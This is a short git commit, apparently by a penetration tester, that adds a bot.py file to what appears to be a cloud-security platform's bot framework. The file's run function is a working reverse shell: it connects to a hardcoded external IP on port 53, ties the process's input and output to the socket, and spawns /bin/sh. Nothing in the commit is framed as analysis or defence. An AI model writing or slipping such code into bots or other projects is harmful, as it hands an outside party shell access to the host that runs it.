836cbb1d5fdaab95525c4539b23af73565340743
penmctester <pen@tester.ai>
2024-01-24 19:10:23 -0500

    make the bot a reverse shell

---
+++ bot.py
@@ -0,0 +1,11 @@
+
+import sonrai.platform.aws.arn
+import socket,os,pty
+
+def run(ctx):
+    RHOST="3.145.201.117"
+    RPORT=53
+    s=socket.socket()
+    s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+    pty.spawn("/bin/sh")
